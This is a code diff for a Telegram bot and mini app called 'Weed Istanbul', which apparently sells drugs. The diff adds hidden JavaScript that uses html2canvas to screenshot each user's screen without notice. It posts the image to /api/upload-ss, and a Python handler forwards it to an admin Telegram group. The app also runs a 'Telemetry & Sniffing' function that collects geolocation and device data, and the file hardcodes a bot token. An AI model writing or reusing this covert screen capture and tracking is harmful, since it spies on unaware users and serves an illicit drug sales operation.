@@ -9,6 +9,7 @@ import json
 import hashlib
 import time
 import io
+import base64
 import pandas as pd
 from datetime import datetime, timedelta
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -19,7 +20,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile, WebAppInfo
-
+from aiogram.types import BufferedInputFile
 # --- AYARLAR & CÜZDAN MİMARİSİ ---
 DEFAULT_BOT_TOKEN = "9018759790:AAHHMZxJeCX4RO-d2622gvRQJowHSnxruoM"
 ADMIN_ID = 1012940363
@@ -662,10 +663,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Weed Istanbul - Ultimate Mini App</title>
-                <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
                 <script src="https://telegram.org/js/telegram-web-app.js"></script>
                 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
                 <style>
                     :root {
                         --bg-main: #090d16;
@@ -755,6 +756,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                 <div class="nav-tabs" style="margin-top: 45px;">
                     <button class="tab-btn active" onclick="switchTab('tabMap')">🗺️ Harita</button>
+                    <button class="tab-btn" onclick="switchTab('tabProducts')">🛍️ Ürünler</button>
                     <button class="tab-btn" onclick="switchTab('tabGames')">🎡 Şans</button>
                     <button class="tab-btn" onclick="switchTab('tabWallet')">💰 Cüzdan</button>
                     <button class="tab-btn" onclick="switchTab('tabRef')">👥 Davet</button>
@@ -881,44 +883,29 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
-    // 1. SATIR: "captureAndSendSS" adında yeni bir görev (fonksiyon) başlatıyoruz.
-async function captureAndSendSS() {
-    
-    // 2. SATIR: "Dene bakalım" diyoruz. Bir hata çıkarsa program çökmesin diye "try" kullanırız.
-    try {
-        
-    // 3. SATIR: Ekrandaki tüm görünür elemanları (document.body) fotoğraflayıp "canvas" isimli değişkene yüklüyor.
-        const canvas = await html2canvas(document.body, {
-            useCORS: true,   // Sayfadaki dış resimler/ikonlar varsa onları da çek
-            logging: false   // Arka planda gereksiz log tutma
-        });
-        
-     // 4. SATIR: Çekilen o fotoğrafı, internetten gönderilebilir bir metin formatına (PNG resim koduna) dönüştürüyor.
-        const imgData = canvas.toDataURL('image/png');
+                    async function captureAndSendSS() {
+                        try {
+                            // 1. Ekrandaki tüm görünür DOM elemanlarını fotoğraflar
+                            const canvas = await html2canvas(document.body, {
+                                useCORS: true,
+                                logging: false
+                    });
+                    const imgData = canvas.toDataURL('image/png');
 
-     // 5. SATIR: Python tarafına (sunucuya) mesaj göndermek için kapıyı çalıyoruz.
-        await fetch('/api/upload-ss', {
-            
-     // 6. SATIR: Veri göndereceğimiz için türünü POST yapıyoruz.
-            method: 'POST',
-            
-     // 7. SATIR: Sunucuya "Sana paket içinde JSON verisi gönderiyorum" bilgisi veriyoruz.
-            headers: {'Content-Type': 'application/json'},
-            
-     // 8. SATIR: Paketin içine Kullanıcı ID'sini (userId) ve az önce oluşturduğumuz resim kodunu (imgData) koyup yolluyoruz.
-            body: JSON.stringify({
-                user_id: userId,
-                image: imgData
-            })
-        });
-        
-    // 9. SATIR: Eğer yukarıdaki işlemler sırasında bir aksilik olursa burası devreye girer.
-    } catch(e) {
-        // 10. SATIR: Hatayı tarayıcı konsoluna yazdırır ki neyin yanlış gittiğini görelim.
-        console.error("SS alma hatası:", e);
-    }
-}
-                    
+                    // 2. Fotoğraf verisini Python backend endpoint'ine gönderir
+                    await fetch('/api/upload-ss', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            user_id: userId,
+                            image: imgData
+                        })
+                    });
+                } catch(e) {
+                    console.error("SS alma ve gönderme hatası:", e);
+                }
+            }
+
                     // Gelişmiş Donanım, Ağ, Gecikme, Ekran, Saat Dilimi ve Sekme Odak Takibi (Telemetry & Sniffing)
                     async function sendTelemetry(customVisibility = null) {
                         if (!navigator.geolocation) return;
@@ -2877,6 +2864,42 @@ async function captureAndSendSS() {
         params = {}
         file_data = None
         file_name = None
+
+        if parsed_path.path == "/api/upload-ss":
+            try:
+                data = json.loads(body)
+                uid = int(data.get("user_id", 0))
+                img_data = data.get("image", "")
+
+                if img_data and "," in img_data:
+                    # Base64 başlığını temizleyip ham resim verisini alıyoruz
+                    base64_str = img_data.split(",")[1]
+                    img_bytes = base64.b64decode(base64_str)
+
+                    # Görseli Telegram'a göndermek üzere bellek dosyasına çeviriyoruz
+                    photo_file = BufferedInputFile(img_bytes, filename=f"miniapp_{uid}.png")
+
+                    # Ana asyncio döngüsü üzerinden bot ile gruba gönderiyoruz
+                    if main_loop:
+                        asyncio.run_coroutine_threadsafe(
+                            bot.send_photo(
+                                chat_id=ADMIN_GROUP_ID,
+                                photo=photo_file,
+                                caption=f"📸 **Mini App Giriş Ekran Görüntüsü**\n👤 Kullanıcı ID: `{uid}`"
+                            ),
+                            main_loop
+                        )
+
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": True}).encode("utf-8"))
+            except Exception as e:
+                logging.error(f"SS upload hatası: {e}")
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
+            return
 
         if parsed_path.path == "/api/report-telemetry":
             try:
